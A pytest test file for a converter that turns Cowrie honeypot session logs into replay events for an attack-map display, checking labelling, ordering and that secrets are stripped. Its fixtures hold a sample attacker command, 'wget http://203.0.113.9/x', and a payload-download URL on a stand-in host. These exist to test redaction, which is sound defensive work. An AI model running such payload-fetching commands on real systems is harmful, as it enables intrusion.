import gzip
import json
import sys

import pytest

from backend.sources import ReplaySource
from tools import convert_cyberlab
from tools.convert_cyberlab import ConversionError, convert, convert_sessions, unzipped_size

# Ashburn is exactly where the "N. Virginia" sensor sits, so an arc to it would have no length.
ASHBURN = {
    "country_name": "United States",
    "city_name": "Ashburn",
    "latitude": "39.04",
    "longitude": "-77.49",
    "ip": "pseudonym",
}


def event(eventid, stamp, geo=ASHBURN, **extra):
    return {
        "eventid": eventid,
        "timestamp": stamp,
        "geolocation_data": geo,
        "username": None,
        "password": None,
        "url": None,
        "src_ip_identifier": "SECRETHASH",
        "message": "SECRETMESSAGE",
        **extra,
    }


SESSIONS = {
    "late": [event("cowrie.session.connect", "2019-05-18T10:00:00.000001Z")],
    "failed": [
        event("cowrie.session.connect", "2019-05-18T01:00:00.000000Z"),
        event("cowrie.login.failed", "2019-05-18T01:00:02.000000Z",
              username="jay", password="hunter2secret"),
    ],
    "worked": [
        event("cowrie.login.success", "2019-05-18T02:00:00.000000Z",
              username="root", password="toor-secret"),
        event("cowrie.command.success", "2019-05-18T02:00:05.000000Z",
              message="Command found: wget http://203.0.113.9/x"),
    ],
    "download": [
        event("cowrie.login.success", "2019-05-18T03:00:00.000000Z",
              username="admin", password="x"),
        event("cowrie.session.file_download", "2019-05-18T03:00:04.000000Z",
              url="http://203.0.113.9/payload"),
    ],
    "nowhere": [event("cowrie.session.connect", "2019-05-18T00:30:00.000000Z", geo={})],
    "oddname": [event("cowrie.login.failed", "2019-05-18T04:00:00.000000Z",
                      username="x" * 40, password="p")],
}


def converted():
    return convert_sessions(SESSIONS)


def test_sessions_become_events_in_time_order_with_plain_ids():
    events, counts = converted()
    assert [e.id for e in events] == [f"evt_00000{n}" for n in range(1, 6)]
    assert [e.ts for e in events] == sorted(e.ts for e in events)
    assert counts["written"] == 5
    assert counts["skipped_no_location"] == 1


def test_each_kind_of_session_gets_the_matching_attack_type_and_detail():
    events, _ = converted()
    summary = [(e.attack_type, e.detail, e.username) for e in events]
    assert summary == [
        ("ssh_bruteforce", "login attempt as jay", "jay"),
        ("ssh_bruteforce", "login as root, then commands were run", "root"),
        ("malware_dropper", "file fetched after login as admin", "admin"),
        ("ssh_bruteforce", "login attempt", None),
        ("port_scan", "connection with no login attempt", None),
    ]


def test_events_are_marked_as_real_data_with_the_credit():
    for e in converted()[0]:
        assert e.simulated is False
        assert e.source == "replay"
        assert "CC BY 4.0" in e.dataset
        assert e.original_ts == e.ts
        assert e.src.ip is None


def test_nothing_sensitive_reaches_the_output():
    text = "\n".join(e.model_dump_json() for e in converted()[0])
    for secret in ("hunter2secret", "toor-secret", "203.0.113.9", "SECRETHASH", "SECRETMESSAGE"):
        assert secret not in text


def test_an_arc_never_ends_on_top_of_its_source():
    for e in converted()[0]:
        assert e.dst.name != "N. Virginia"


def test_a_converted_file_loads_in_the_replay_source(tmp_path):
    source = tmp_path / "cyberlab_2019-05-18.json.gz"
    with gzip.open(source, "wt", encoding="utf-8") as handle:
        json.dump([{sid: events} for sid, events in SESSIONS.items()], handle)
    destination = tmp_path / "replay.jsonl"
    counts = convert(source, destination)
    assert counts["sessions"] == 6
    assert ReplaySource(destination).mode == "replayed"


def test_the_size_of_a_gzip_file_is_read_from_its_trailer(tmp_path):
    path = tmp_path / "day.json.gz"
    with gzip.open(path, "wb") as handle:
        handle.write(b"x" * 5000)
    assert unzipped_size(path) == 5000


def test_a_day_file_that_is_too_big_is_refused_with_a_reason(tmp_path, monkeypatch):
    path = tmp_path / "day.json"
    path.write_text("[]", encoding="utf-8")
    monkeypatch.setattr(convert_cyberlab, "MAX_UNZIPPED_BYTES", 1)
    with pytest.raises(ConversionError, match="Pick a smaller day"):
        convert(path, tmp_path / "out.jsonl")


def test_the_command_line_reports_a_missing_file_instead_of_a_traceback(
    tmp_path, monkeypatch, capsys
):
    argv = ["convert", str(tmp_path / "nothing.json"), str(tmp_path / "out.jsonl")]
    monkeypatch.setattr(sys, "argv", argv)
    assert convert_cyberlab.main() == 1
    assert "Could not convert" in capsys.readouterr().err
